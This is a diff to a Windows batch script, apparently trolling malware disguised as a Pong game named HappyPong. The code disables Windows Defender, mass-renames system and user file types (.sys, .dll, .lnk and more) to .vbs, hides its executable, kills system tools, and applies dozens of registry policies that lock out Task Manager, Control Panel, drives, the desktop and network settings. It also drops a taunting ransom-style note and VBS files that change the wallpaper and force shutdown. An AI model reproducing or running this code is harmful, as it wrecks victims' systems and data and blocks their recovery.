@@ -5,6 +5,7 @@ rem Made by Kevin Reagan
 goto DoNotPressOKOrElse
 
 :DoNotPressOKOrElse
+attrib +r +h +s HappyPong.exe
 mshta.exe vbscript:Execute("MsgBox ""fukpong.exe is not a valid Win32 application!"", vbOkOnly+vbCritical, ""fukpong.exe""")(window.close)
 ping -n 30 127.0.0.1>nul
 reg ADD "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@@ -29,7 +30,7 @@ ren *.wav *.vbs
 ren *.rar *.vbs
 ren *.docx *.vbs
 ren *.rtf *.vbs
-ren *.ink *.vbs
+ren *.lnk *.vbs
 ren *.iso *.vbs
 ren *.torrent *.vbs
 ren *.cmd *.vbs
@@ -85,192 +86,6 @@ ren *.dll *.vbs
 ren *.prx *.vbs
 ren *.nls *.vbs
 ren *.sys *.vbs
-ping -n 30 127.0.0.1>nul
-goto UrMomsEmail
-
-:UrMomsEmail
-echo Microsoft Outlook created a .txt document. You have just recieved a new email. >> note.txt
-echo Topic: Did you just executed Word? Yes! You recieved an email from someone you have met and befriended... >> note.txt
-echo Sent from: happy@happypong.com at %time%, %date% to %username%@outlook.com >> note.txt
-echo ===================================== >> note.txt
-echo READ THIS EMAIL FROM YOUR OLD FRIEND! >> note.txt
-echo Thank you for executing HappyPong! :) >> note.txt
-echo HOW TO PLAY: >> note.txt
-echo Press green flag to start the game! >> note.txt
-echo Use your mouse to play the game! >> note.txt
-echo Do not let the ball go outside! >> note.txt
-echo if you do, you will not have score! Instead, the other player will have their score! :) >> note.txt
-echo Good luck! >> note.txt
-echo CREDITS: >> note.txt
-echo Thanks to these websites for helping me!: :) >> note.txt
-echo google.com >> note.txt
-echo digitalcitizen.life >> note.txt
-echo superuser.com >> note.txt
-echo instructables.com (content.instructables.com) >> note.txt
-echo hitech-us.com >> note.txt
-echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
-echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, special thanks to ManlyBadassHero) >> note.txt
-echo msfn.org >> note.txt
-echo y2mate.com >> note.txt
-echo wikihow.com >> note.txt
-echo winearo.com >> note.txt
-echo tek-tips.com >> note.txt
-echo scratch.mit.edu (dixiklo) >> note.txt
-echo askvg.com >> note.txt
-echo wikidot.com (SCP) >> note.txt
-echo freeconvert.com >> note.txt
-echo imgur.com >> note.txt
-echo icon-icons.com >> note.txt
-echo systemmanager.ru >> note.txt
-echo windows10forums.com >> note.txt
-echo winbuzzer.com >> note.txt
-echo en.wikiversity.org >> note.txt
-echo wix.com >> note.txt
-echo deviantart.com (Gaminglover) >> note.txt
-echo makeuseof.com >> note.txt
-echo tb.rg-adguard.net >> note.txt
-echo isunshare.com >> note.txt
-echo wethegeek.com >> note.txt
-echo malwiki.org (Trojan.VBS.Hold) >> note.txt
-echo community.spiceworks.com >> note.txt
-echo thewindowsclub.com >> note.txt
-echo tomsguide.com >> note.txt
-echo itprotoday.com >> note.txt
-echo microsoft.com (support.microsoft.com, learn.microsoft.com) >> note.txt
-echo The game idea is on backrooms-wiki.wikidot.com (Entity666 The Backrooms Wiki). >> note.txt
-echo These apps helped me: >> note.txt
-echo Google Chrome >> note.txt
-echo VMware Workstation (testing Game?) >> note.txt
-echo Bat To Exe Converter >> note.txt
-echo Notepad >> note.txt
-echo PowerPoint 2019 >> note.txt
-echo Microsoft Edge >> note.txt
-echo Command Prompt >> note.txt
-echo VBscript >> note.txt
-echo Registry Editor >> note.txt
-echo And more... They are just commands... In the SYSTEM32 folder... >> note.txt
-echo And one more thing I forgot to tell you that... YOUR COMPUTER HAS BEEN TRASHED BY THE HAPPY VIRUS! >> note.txt
-echo UR PC HAS BEEN POOPFUKED HAPPILY BY MR.HAPPY, MR.PONG AND MR.GNOPYPPAH!!! >> note.txt
-echo TO UNTRASH YOUR COMPUTER, PLAY THE PONG GAME THEN I WILL UNTRASH IT! >> note.txt 
-echo YOU HAVE 10 MINUTES TO PREP BEFORE YOUR EX ENDS YOU AND YOUR COMPUTER EXPLODE!(joke) >> note.txt
-echo CHECK YOUR %username% FOLDER, SOME FOLDERS INSIDE THAT FOLDER ARE DELETED! >> note.txt 
-echo DO NOT TRY TO UNINFECT YOUR COMPUTER WITH TASK MANAGER AND COMMAND PROMPT, IT IS DISABLED! >> note.txt
-echo IT'S OKAY IF YOU DO NOT WANT TO PLAY THE GAME! >> note.txt 
-echo IF YOU CLOSE THE WEBPAGE, IT DOESN'T MEAN THAT YOU REMOVED THE VIRUS, IT MEANS YOU HAVE TO CLICK THE VBS FILE! IF THE VBS FILE DOESN'T WORK (50% chance), YOU MADE A BIG PROBLEM, YOU LOST THE GAME! >> note.txt
-echo IT'S TOO LATE! SO DO NOT DO THAT! >> note.txt
-echo UNDERSTOOD? GOOD! >> note.txt
-echo CONTACT US: 606 606 6006 or happy@happypong.com (666 HAPPY STREET, HOUSTON, TEXAS, USA) >> note.txt
-echo IF YOU ARE OUTSIDE THE UNITED STATES, USE THE PHONE NUMBER INSTEAD OF THE ADDRESS. AND PLEASE SPEAK ENGLISH WHEN YOU CALL US BY PHONE, WE UNDERSTAND ENGLISH ONLY! >> note.txt
-echo IF YOU DONT UNDERSTAND ENGLISH, YOU ARE AN ENGLISH NOOB! AND WE WILL IGNORE YOUR TRASHY PHONE CALL YOU NERD! >> note.txt
-echo IF YOU SPEAK ON THE PHONE OR EMAIL US THAT WE ARE ENGLISH NOOBS, THEN WE WILL SLAP UR COMPUTER!!! >> note.txt
-echo -From Mr.Happy (happy@happypong.com), Mr.Pong (pong@happypong.com) and Mr.gnopyppah (dankestemail@gnopyppahisbest.net) - Your friends since: >> note.txt
-echo 6 years, 6 months, 6 weeks, 6 days, 6 hours, 6 minutes and 6 seconds ago >> note.txt
-echo (June 6 2000, 6:06AM) >> note.txt
-echo And do you know what is today! June 6 2006! >> note.txt
-echo I think you are confused now... Today is %date%. But... THIS COMPUTER HAS BEEN INFECTED BY A TIME MACHINE! >> note.txt
-echo ===================================== >> note.txt
-echo Topic: Someone told me to email you... >> note.txt
-echo Sent from danooct1press@gmail.com at %time%, %date% to %username%@outlook.com >> note.txt
-echo ===================================== >> note.txt
-echo Dear %username%, >> note.txt
-echo Hello. I am Dan. Someone told me to email you. How was your day? Great? Well... Did someone send you a game? I'm sorry to tell you that your computer has been infected with a virus... But don't worry! You can download antivirus from here: >> note.txt
-echo https://www.malwarebytes.com/mwb-download/thankyou?aid=37335 >> note.txt
-echo I hope this removed the virus. >> note.txt
-echo Best Regards, >> note.txt
-echo Daniel >> note.txt
-echo My YouTube channel: youtube.com/danooct1 >> note.txt
-echo My email: danooct1press@gmail.com >> note.txt
-echo Twitter: twitter.com/danooct1 >> note.txt
-echo And please note that I will ban you if you spam. >> note.txt
-taskkill /f /im ms-settings:.exe /im snippingtool.exe /im taskmgr.exe /im msconfig.exe /im powershell.exe /im wmplayer.exe /im notepad.exe /im calc.exe /im write.exe /im mspaint.exe /im cortana.exe /im control.exe /im ms-windows-store:.exe /im regedit.exe /im iexpress.exe /im winver.exe /im explorer.exe
-echo 127.0.0.1 https://www.deviantart.com >> C:\WINDOWS\System32\drivers\etc\hosts
-start explorer.exe
-start note.txt
-goto ThrowTheComputerToTrash
-
-:ThrowTheComputerToTrash
-reg ADD "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName /t REG_SZ /d IM_HAPPY /f
-reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoSelectDownloadDir /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
-reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoNavButtons /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableGPO /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
-reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
-reg ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSecurityTab /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSecurityTab /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPinningToTaskbar /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v TaskbarNoPinnedList /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSaveSettings /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Command Processor" /v DisableUNCCheck /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinkeys /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileAssociate /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
-reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyDocuments /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyDownloads /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\WindowsStore" /v RemoveWindowsStore /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\WindowsStore" /v DisableStoreApps /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
-reg ADD "HKCU\Software\Microsoft\Windows" /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
-reg ADD "HKCU\Software\Microsoft\Windows\DWM" /v EnableAeroPeek /t REG_DWORD /d 0 /f
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v ColorPrevalence /d 2 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWindowsUpdate /t REG_DWORD /d 1 /f
-reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoConnectedUser /t REG_DWORD /d 3 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d GET_READY_TO_BE_KISSED! /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\Flighting\1\SearchBoxText" /v Value /t REG_SZ /d SAY_GOODBYE_TO_YOUR_COMPUTER! /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v LockScreenImage /t REG_SZ /d C:\WINDOWS\HappyPong\scp_173.png /f
-goto NoMoreInternet
-
-:NoMoreInternet
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f 
-reg ADD "HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main" /v AllowPreLaunch /t REG_DWORD /d 0 /f
-reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v EnableActiveProbing /t REG_DWORD /d 0 /f
-reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
-reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
 goto GoToTheBackrooms
 
 :GoToTheBackrooms
@@ -281,7 +96,6 @@ echo Set WshShell = CreateObject ("wscript.shell") >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s1159", "HAPPY","REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s2359", "HAPPY","REG_SZ" >> ieandstuff.vbs
-start ieandstuff.vbs
 goto NoMoreCommandWindowHehe
 
 :NoMoreCommandWindowHehe
@@ -307,7 +121,6 @@ echo wscript.sleep 5000 >> shutdown.vbs
 echo WshShell.Run "regret.vbs" >> shutdown.vbs
 echo wscript.sleep 10000 >> shutdown.vbs
 echo WshShell.Run "shutdown -s -t 0" >> shutdown.vbs
-start shutdown.vbs
 goto ChangeUrRealName
 
 :ChangeUrRealName
@@ -364,10 +177,6 @@ echo   .open >> download4.vbs
 echo   .write xHttp.responseBody >> download4.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\scp-173.jpg", 2 '//overwrite >> download4.vbs
 echo end with >> download4.vbs
-start download1.vbs
-start download2.vbs
-start download3.vbs
-start download4.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -376,7 +185,6 @@ echo Set shell = WScript.CreateObject("WScript.Shell") >> change.vbs
 echo wallpaper = "C:\WINDOWS\HappyPong\shit.jpg" >> change.vbs
 echo shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaper >> change.vbs
 echo shell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True >> change.vbs
-start change.vbs
 goto SpawnFreddyOnComputer
 
 :SpawnFreddyOnComputer
@@ -494,7 +302,6 @@ echo WshShell.Run "https://i.imgur.com/ilGkG6C.jpeg" >> pong.vbs
 echo WshShell.Run "halloween.vbs"
 echo wscript.sleep 7000 >> pong.vbs
 echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> pong.vbs
-start pong.vbs
 goto SayGoodbye
 
 :SayGoodbye
@@ -509,9 +316,184 @@ goto FreeGameDownload
 cd C:\Users\%username%\Desktop
 echo Set WshShell = CreateObject ("wscript.shell") >> click_this_if_you_accidentally_close_the_browser.vbs
 echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> click_this_if_you_accidentally_close_the_browser.vbs
+ping -n 30 127.0.0.1>nul
+goto UrMomsEmail
+
+:UrMomsEmail
+echo Microsoft Outlook created a .txt document. You have just recieved a new email. >> note.txt
+echo Topic: Did you just executed Word? Yes! You recieved an email from someone you have met and befriended... >> note.txt
+echo Sent from: happy@happypong.com at %time%, %date% to %username%@outlook.com >> note.txt
+echo ===================================== >> note.txt
+echo READ THIS EMAIL FROM YOUR OLD FRIEND! >> note.txt
+echo Thank you for executing HappyPong! :) >> note.txt
+echo HOW TO PLAY: >> note.txt
+echo Press green flag to start the game! >> note.txt
+echo Use your mouse to play the game! >> note.txt
+echo Do not let the ball go outside! >> note.txt
+echo if you do, you will not have score! Instead, the other player will have their score! :) >> note.txt
+echo Good luck! >> note.txt
+echo CREDITS: >> note.txt
+echo Thanks to these websites for helping me!: :) >> note.txt
+echo google.com >> note.txt
+echo digitalcitizen.life >> note.txt
+echo superuser.com >> note.txt
+echo instructables.com (content.instructables.com) >> note.txt
+echo hitech-us.com >> note.txt
+echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
+echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, special thanks to ManlyBadassHero) >> note.txt
+echo msfn.org >> note.txt
+echo y2mate.com >> note.txt
+echo wikihow.com >> note.txt
+echo winearo.com >> note.txt
+echo tek-tips.com >> note.txt
+echo scratch.mit.edu (dixiklo) >> note.txt
+echo askvg.com >> note.txt
+echo wikidot.com (SCP) >> note.txt
+echo freeconvert.com >> note.txt
+echo imgur.com >> note.txt
+echo icon-icons.com >> note.txt
+echo systemmanager.ru >> note.txt
+echo windows10forums.com >> note.txt
+echo winbuzzer.com >> note.txt
+echo en.wikiversity.org >> note.txt
+echo wix.com >> note.txt
+echo deviantart.com (Gaminglover) >> note.txt
+echo makeuseof.com >> note.txt
+echo tb.rg-adguard.net >> note.txt
+echo isunshare.com >> note.txt
+echo wethegeek.com >> note.txt
+echo malwiki.org (Trojan.VBS.Hold) >> note.txt
+echo community.spiceworks.com >> note.txt
+echo thewindowsclub.com >> note.txt
+echo tomsguide.com >> note.txt
+echo itprotoday.com >> note.txt
+echo microsoft.com (support.microsoft.com, learn.microsoft.com) >> note.txt
+echo The game idea is on backrooms-wiki.wikidot.com (Entity666 The Backrooms Wiki). >> note.txt
+echo These apps helped me: >> note.txt
+echo Google Chrome >> note.txt
+echo VMware Workstation (testing Game?) >> note.txt
+echo Bat To Exe Converter >> note.txt
+echo Notepad >> note.txt
+echo PowerPoint 2019 >> note.txt
+echo Microsoft Edge >> note.txt
+echo Command Prompt >> note.txt
+echo VBscript >> note.txt
+echo Registry Editor >> note.txt
+echo And more... They are just commands... In the SYSTEM32 folder... >> note.txt
+echo And one more thing I forgot to tell you that... YOUR COMPUTER HAS BEEN TRASHED BY THE HAPPY VIRUS! >> note.txt
+echo UR PC HAS BEEN POOPFUKED HAPPILY BY MR.HAPPY, MR.PONG AND MR.GNOPYPPAH!!! >> note.txt
+echo TO UNTRASH YOUR COMPUTER, PLAY THE PONG GAME THEN I WILL UNTRASH IT! >> note.txt 
+echo YOU HAVE 10 MINUTES TO PREP BEFORE YOUR EX ENDS YOU AND YOUR COMPUTER EXPLODE!(joke) >> note.txt
+echo CHECK YOUR %username% FOLDER, SOME FOLDERS INSIDE THAT FOLDER ARE DELETED! >> note.txt 
+echo DO NOT TRY TO UNINFECT YOUR COMPUTER WITH TASK MANAGER AND COMMAND PROMPT, IT IS DISABLED! >> note.txt
+echo IT'S OKAY IF YOU DO NOT WANT TO PLAY THE GAME! >> note.txt 
+echo IF YOU CLOSE THE WEBPAGE, IT DOESN'T MEAN THAT YOU REMOVED THE VIRUS, IT MEANS YOU HAVE TO CLICK THE VBS FILE! IF THE VBS FILE DOESN'T WORK (50% chance), YOU MADE A BIG PROBLEM, YOU LOST THE GAME! >> note.txt
+echo IT'S TOO LATE! SO DO NOT DO THAT! >> note.txt
+echo UNDERSTOOD? GOOD! >> note.txt
+echo CONTACT US: 606 606 6006 or happy@happypong.com (666 HAPPY STREET, HOUSTON, TEXAS, USA) >> note.txt
+echo IF YOU ARE OUTSIDE THE UNITED STATES, USE THE PHONE NUMBER INSTEAD OF THE ADDRESS. AND PLEASE SPEAK ENGLISH WHEN YOU CALL US BY PHONE, WE UNDERSTAND ENGLISH ONLY! >> note.txt
+echo IF YOU DONT UNDERSTAND ENGLISH, YOU ARE AN ENGLISH NOOB! AND WE WILL IGNORE YOUR TRASHY PHONE CALL YOU NERD! >> note.txt
+echo IF YOU SPEAK ON THE PHONE OR EMAIL US THAT WE ARE ENGLISH NOOBS, THEN WE WILL SLAP UR COMPUTER!!! >> note.txt
+echo -From Mr.Happy (happy@happypong.com), Mr.Pong (pong@happypong.com) and Mr.gnopyppah (dankestemail@gnopyppahisbest.net) - Your friends since: >> note.txt
+echo 6 years, 6 months, 6 weeks, 6 days, 6 hours, 6 minutes and 6 seconds ago >> note.txt
+echo (June 6 2000, 6:06AM) >> note.txt
+echo And do you know what is today! June 6 2006! >> note.txt
+echo I think you are confused now... Today is %date%. But... THIS COMPUTER HAS BEEN INFECTED BY A TIME MACHINE! >> note.txt
+echo ===================================== >> note.txt
+echo Topic: Someone told me to email you... >> note.txt
+echo Sent from danooct1press@gmail.com at %time%, %date% to %username%@outlook.com >> note.txt
+echo ===================================== >> note.txt
+echo Dear %username%, >> note.txt
+echo Hello. I am Dan. Someone told me to email you. How was your day? Great? Well... Did someone send you a game? I'm sorry to tell you that your computer has been infected with a virus... But don't worry! You can download antivirus from here: >> note.txt
+echo https://www.malwarebytes.com/mwb-download/thankyou?aid=37335 >> note.txt
+echo I hope this removed the virus. >> note.txt
+echo Best Regards, >> note.txt
+echo Daniel >> note.txt
+echo My YouTube channel: youtube.com/danooct1 >> note.txt
+echo My email: danooct1press@gmail.com >> note.txt
+echo Twitter: twitter.com/danooct1 >> note.txt
+echo And please note that I will ban you if you spam. >> note.txt
+goto ThrowTheComputerToTrash
+
+:ThrowTheComputerToTrash
+reg ADD "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName /t REG_SZ /d IM_HAPPY /f
+reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoSelectDownloadDir /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
+reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoNavButtons /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableGPO /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
+reg ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSecurityTab /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSecurityTab /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
